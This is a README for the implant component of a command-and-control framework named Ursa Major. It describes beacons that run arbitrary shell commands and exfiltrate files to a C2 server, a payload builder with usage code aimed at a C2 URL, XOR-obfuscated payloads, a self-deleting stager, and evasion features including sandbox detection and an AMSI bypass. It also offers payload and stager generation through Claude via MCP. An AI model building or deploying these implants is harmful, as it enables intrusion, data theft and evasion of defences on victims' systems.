# Implants

Target-side components that run on compromised systems and communicate back to [Ursa Major](../major/README.md).

## Beacons

### Python beacon (`beacon.py`)

Full-featured HTTP implant. Beacons back to the C2 server on a configurable interval with jitter, executes tasks, and returns results.

### Go beacon (`templates/http_go.go`)

Compiled, cross-platform beacon. No Python runtime required on the target — produces a standalone binary. Cross-compiles for Linux, Windows, and macOS from any host.

### Zig template (`templates/http_zig.zig`)

Skeleton for a Zig-compiled beacon. Struct layout and main loop are implemented; task handlers are stubs awaiting implementation.

## Task Types

All beacons support these task types:

| Task | Description |
|------|-------------|
| `shell` | Execute an arbitrary shell command |
| `sysinfo` | Gather hostname, OS, arch, user, environment |
| `ps` | List running processes |
| `whoami` | Current user and privilege info |
| `pwd` | Print working directory |
| `cd` | Change working directory |
| `ls` | List directory contents |
| `env` | Dump environment variables |
| `download` | Exfiltrate a file to the C2 |
| `upload` | Receive a file from the C2 and write to disk |
| `sleep` | Update beacon interval and jitter |
| `kill` | Self-terminate the implant |

## Payload Builder

`builder.py` generates configured payloads from templates for any language. It substitutes three tokens at build time:

| Token | Replaced with |
|-------|---------------|
| `URSA_C2_URL` | C2 server URL, e.g. `http://10.0.0.1:6708` |
| `URSA_INTERVAL` | Beacon interval in seconds, e.g. `5` |
| `URSA_JITTER` | Jitter factor 0.0–1.0, e.g. `0.1` |

```python
from implants.builder import Builder, PayloadConfig

# Python payload
cfg = PayloadConfig(c2_url="http://10.0.0.1:6708", template="http_python")
source = Builder().build(cfg)

# Go payload — build and compile in one step
cfg = PayloadConfig(
    c2_url="http://10.0.0.1:6708",
    template="http_go",
    post_build="go build -o {binary} {output}",
)
src_path, binary_path = Builder().build_and_compile(cfg, Path("/tmp/agent.go"))
```

### CLI

```bash
python -m implants.builder list                        # List available templates
python -m implants.builder build --c2 http://10.0.0.1:6708
python -m implants.builder build \
    --template http_go \
    --c2 http://10.0.0.1:6708 \
    --output /tmp/agent.go \
    --post-build "go build -o {binary} {output}"
```

### Cross-compilation (Go)

```bash
# Linux/amd64
GOOS=linux GOARCH=amd64 go build -o agent-linux agent.go

# Windows/amd64
GOOS=windows GOARCH=amd64 go build -o agent.exe agent.go

# macOS/arm64
GOOS=darwin GOARCH=arm64 go build -o agent-mac agent.go
```

### Obfuscation

```python
cfg = PayloadConfig(c2_url="...", obfuscate=True)
stub = Builder().build(cfg)   # XOR+base64 decode stub, C2 URL not in plaintext
```

### Custom tokens

Add arbitrary key-value substitutions for your own template variables:

```python
cfg = PayloadConfig(
    c2_url="http://10.0.0.1:6708",
    extra_tokens={"URSA_SLEEP_CMD": "ping -n 5 localhost"},
)
```

### Via MCP

Payloads can be generated through Claude without leaving the terminal:
- `ursa_generate` — full beacon script or compiled binary
- `ursa_stager` — one-liner stagers for bash, python, powershell

## Stager (`stager.py`)

Minimal first-stage dropper. Downloads the full beacon from the C2's `/stage` endpoint, writes it to a temp path, executes it, and self-deletes.

## Evasion (`evasion.py`)

Defensive evasion primitives used by the Python beacon (opt-in).

**Sandbox / VM detection (14 checks):**
- Hardware fingerprinting — RAM < 2 GB, CPU cores ≤ 1, disk < 50 GB
- VM MAC OUI matching (VMware, VirtualBox, QEMU, Xen, Parallels)
- VMware/VirtualBox/QEMU indicators in DMI/SMBIOS
- Sandbox username and hostname pattern matching
- Low process count
- Known analysis tool detection (Wireshark, Procmon, x64dbg, Ghidra, and others)

**Debugger detection:**
- Linux: `/proc/self/status` TracerPid check
- Windows: `IsDebuggerPresent` via ctypes
- macOS: P_TRACED flag via `sysctl`

**Evasion primitives:**
- `spoof_process_name()` — changes the visible process name via setproctitle/prctl/argv[0]
- `amsi_bypass()` — patches AMSI in-process on Windows to disable scanning
- `obfuscated_sleep()` — multi-method sleep that evades basic sleep-hook detections

## Communication Flow

```
1. REGISTER    beacon ──POST /register──► C2
                        ◄── session_id + AES-256-GCM key + crypto metadata

2. BEACON      beacon ──POST /beacon {encrypted: true}──► C2
                        ◄── AES-GCM frame containing pending tasks

3. EXECUTE     beacon runs task locally

4. RESULT      beacon ──POST /result────► C2
                        AES-GCM frame containing result/error

5. REPEAT      goto 2 (after interval ± jitter)
```

Encrypted envelopes use `URS2 || 12-byte nonce || ciphertext || 16-byte tag`
with AES-256-GCM and AAD `ursa-major-c2:v2:aes-256-gcm`. Legacy
CTR/HMAC-style encrypted frames are rejected; redeploy old encrypted implants
so they re-register under the AEAD protocol. Plaintext compatibility remains
available when a client omits `encrypted: true`.

## File Structure

```
implants/
├── beacon.py        # Python HTTP beacon
├── stager.py        # Minimal first-stage dropper
├── builder.py       # Language-agnostic payload builder
├── evasion.py       # Sandbox detection and evasion primitives
└── templates/
    ├── http_python.py   # Python beacon template
    ├── http_go.go       # Go beacon template (fully implemented)
    └── http_zig.zig     # Zig beacon template (skeleton)
```
